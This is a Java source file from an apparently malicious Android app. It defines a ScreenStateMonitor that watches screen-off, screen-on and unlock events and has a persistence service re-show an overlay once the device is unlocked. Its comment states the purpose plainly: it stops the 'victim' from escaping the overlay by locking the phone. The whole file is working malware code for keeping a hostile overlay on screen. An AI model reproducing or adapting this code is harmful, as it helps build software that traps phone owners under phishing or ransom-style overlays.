package com.fason.app.features.springe.persistence;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import com.fason.app.features.springe.SpringeEngine;

/**
 * ScreenStateMonitor — Tracks screen on/off and unlock events.
 *
 * When an overlay is active and the user:
 * - Turns screen off → waits for screen on
 * - Turns screen on → waits for unlock
 * - Unlocks device → notifies OverlayPersistenceService to re-show overlay
 *
 * This prevents the victim from escaping the overlay by locking the device.
 *
 * Uses PowerManager for screen state and Intent receivers for
 * SCREEN_ON / SCREEN_OFF / USER_PRESENT broadcasts.
 */
public final class ScreenStateMonitor {

    private static final String TAG = "ScreenStateMonitor";

    private final Context context;
    private final OverlayPersistenceService persistenceService;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private volatile boolean registered = false;
    private volatile boolean screenOff = false;
    private volatile boolean waitingForUnlock = false;

    // Broadcast receiver for screen state
    private final BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                onScreenOff();
            } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
                onScreenOn();
            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                onUserPresent();
            }
        }
    };

    public ScreenStateMonitor(Context context, OverlayPersistenceService persistenceService) {
        this.context = context.getApplicationContext();
        this.persistenceService = persistenceService;
    }

    /**
     * Start monitoring screen state.
     */
    public void start() {
        if (registered) return;

        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_USER_PRESENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(screenReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                context.registerReceiver(screenReceiver, filter);
            }

            registered = true;
            Log.d(TAG, "Screen state monitoring started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register screen receiver", e);
        }
    }

    /**
     * Stop monitoring.
     */
    public void stop() {
        if (!registered) return;

        try {
            context.unregisterReceiver(screenReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Error unregistering screen receiver", e);
        }

        registered = false;
        screenOff = false;
        waitingForUnlock = false;
        Log.d(TAG, "Screen state monitoring stopped");
    }

    public boolean isRegistered() { return registered; }
    public boolean isScreenOff() { return screenOff; }

    /* ─── Internal State Handlers ─── */

    private void onScreenOff() {
        screenOff = true;
        waitingForUnlock = true;
        Log.d(TAG, "Screen OFF — waiting for unlock");
    }

    private void onScreenOn() {
        screenOff = false;
        Log.d(TAG, "Screen ON — waiting for user presence");

        // If the device has no lock screen, USER_PRESENT may not fire
        // Fallback: check after a short delay
        mainHandler.postDelayed(() -> {
            if (waitingForUnlock) {
                PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                if (pm != null && pm.isInteractive()) {
                    // Device is on but no lock screen — treat as unlocked
                    onUserPresent();
                }
            }
        }, 2000);
    }

    private void onUserPresent() {
        if (!waitingForUnlock) return;

        waitingForUnlock = false;
        Log.d(TAG, "User present (device unlocked)");

        // Notify persistence service to re-show overlays
        persistenceService.onScreenUnlocked();
    }
}
